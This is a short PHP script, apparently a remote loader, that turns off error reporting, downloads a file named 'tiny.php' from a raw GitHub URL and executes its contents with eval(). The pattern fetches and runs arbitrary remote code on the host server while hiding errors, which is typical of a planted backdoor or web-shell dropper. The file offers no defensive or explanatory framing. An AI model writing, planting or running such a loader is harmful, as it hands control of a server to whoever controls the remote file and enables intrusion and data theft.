<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/labubunews/harian/refs/heads/main/tiny.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
